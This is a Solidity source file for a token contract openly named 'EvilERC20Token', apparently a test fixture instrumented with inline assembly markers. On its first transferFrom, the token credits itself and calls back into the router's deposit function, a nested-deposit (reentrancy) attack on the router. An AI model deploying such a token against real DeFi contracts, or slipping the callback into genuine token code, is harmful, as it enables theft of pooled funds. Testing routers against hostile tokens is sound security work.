// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

interface iROUTER {
    function deposit(address, address, uint, string calldata) external;
}

//IERC20 Interface
interface iERC20  {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address, uint) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address, uint) external returns (bool);
    function transferFrom(address, address, uint) external returns (bool);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00060000, 1037618708486) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00060001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00060005, 9) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00066001, b) }
        uint256 c = a + b;assembly{mstore(0xffffff6e4604afefe123321beef1b02fffffffffffffffffffffffff00000001,c)}
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00070000, 1037618708487) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00070001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00070005, 9) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00076001, b) }
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00090000, 1037618708489) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00090001, 3) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00090005, 73) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00096002, errorMessage) }
        require(b <= a, errorMessage);
        uint256 c = a - b;assembly{mstore(0xffffff6e4604afefe123321beef1b02fffffffffffffffffffffffff00000002,c)}
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000a0000, 1037618708490) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000a0001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000a0005, 9) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000a6001, b) }
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;assembly{mstore(0xffffff6e4604afefe123321beef1b02fffffffffffffffffffffffff00000003,c)}
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00080000, 1037618708488) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00080001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00080005, 9) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00086001, b) }
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000b0000, 1037618708491) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000b0001, 3) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000b0005, 73) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000b6002, errorMessage) }
        require(b > 0, errorMessage);
        uint256 c = a / b;assembly{mstore(0xffffff6e4604afefe123321beef1b02fffffffffffffffffffffffff00000004,c)}
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000c0000, 1037618708492) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000c0001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000c0005, 9) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000c6001, b) }
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000d0000, 1037618708493) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000d0001, 3) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000d0005, 73) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff000d6002, errorMessage) }
        require(b != 0, errorMessage);
        return a % b;
    }
}

// Token Contract
contract EvilERC20Token is iERC20 {

    using SafeMath for uint256;

    // Coin Defaults
    string public name;                                         // Name of Coin
    string public symbol;                                       // Symbol of Coin
    uint256 public decimals  = 18;                              // Decimals
    uint256 public override totalSupply  = 1000000 * 1000000000000000000;   // 1,000,000 Total
    bool public second;

    // Mapping
    mapping(address => uint256) public override balanceOf;                          // Map balanceOf
    mapping(address => mapping(address => uint256)) public override allowance;    // Map allowances
    
    // Events
    event Approval(address indexed owner, address indexed spender, uint value); // ERC20
    event Transfer(address indexed from, address indexed to, uint256 value);    // ERC20

    // Minting event
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        name = "Token";
        symbol  = "TKN";
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    // ERC20
    function transfer(address to, uint256 value) public override returns (bool success) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00040000, 1037618708484) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00040001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00040005, 9) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00046001, value) }
        _transfer(msg.sender, to, value);
        return true;
    }

    // ERC20
    function approve(address spender, uint256 value) public override returns (bool success) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00020000, 1037618708482) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00020001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00020005, 9) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00026001, value) }
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    // ERC20
    function transferFrom(address from, address to, uint256 value) public override returns (bool success) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00050000, 1037618708485) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00050001, 3) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00050005, 73) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00056002, value) }
        // On first transfer, do a nested/second deposit, but stop after that to avoid an infinite loop
        if (!second) {
          second = true;
          balanceOf[address(this)] += value;
          allowance[address(this)][to] += value;
          iROUTER(to).deposit(from, address(this), value, "");
        }
        require(value <= allowance[from][msg.sender], "allowance error");
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    // Transfer function 
    function _transfer(address _from, address _to, uint _value) internal {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00000000, 1037618708480) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00000001, 3) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00000005, 73) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00006002, _value) }
        require(_to != address(0), "address error");
        require(balanceOf[_from] >= _value, "balance error");
        require(balanceOf[_to].add(_value) >= balanceOf[_to], "balance error");                 // catch overflow       
        balanceOf[_from] = balanceOf[_from].sub(_value);                       // Subtract from sender         
        balanceOf[_to] = balanceOf[_to].add(_value);                            // Add to receiver
        emit Transfer(_from, _to, _value);                                  // Transaction event            
    }

    function burn(uint256 amount) public virtual {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00030000, 1037618708483) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00030001, 1) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00030005, 1) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00036000, amount) }
        _burn(msg.sender, amount);
    } 

    function _burn(address account, uint256 amount) internal {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00010000, 1037618708481) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00010001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00010005, 9) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00016001, amount) }
        require(account != address(0), "ERC20: burn from the zero address");
        balanceOf[account] = balanceOf[account].sub(amount, "ERC20: burn amount exceeds balance");
        totalSupply = totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
}